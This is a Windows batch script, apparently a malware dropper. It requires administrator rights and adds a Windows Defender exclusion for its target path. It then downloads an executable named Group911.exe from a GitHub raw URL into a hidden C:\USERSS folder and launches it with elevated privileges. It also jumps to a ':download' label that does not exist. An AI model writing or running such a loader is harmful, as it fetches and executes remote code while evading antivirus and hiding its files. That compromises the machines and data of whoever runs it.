@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as administrator.
    pause
    exit /b
)

set "download_url=https://raw.githubusercontent.com/uj9e/g/refs/heads/main/Group911.exe"
set "destination=C:\USERSS\Group911.exe"
set "hidden_dir=C:\USERSS"

if not exist "%hidden_dir%" (
    mkdir "%hidden_dir%"
)

powershell -Command "Add-MpPreference -ExclusionPath '%destination%'"

if not exist "%destination%" (
    powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%destination%'"
)

attrib +h "%hidden_dir%"

if exist "%destination%" (
    echo Program is installed and hidden.
) else (
    goto :download
)

powershell -Command "Start-Process '%destination%' -Verb runAs"
exit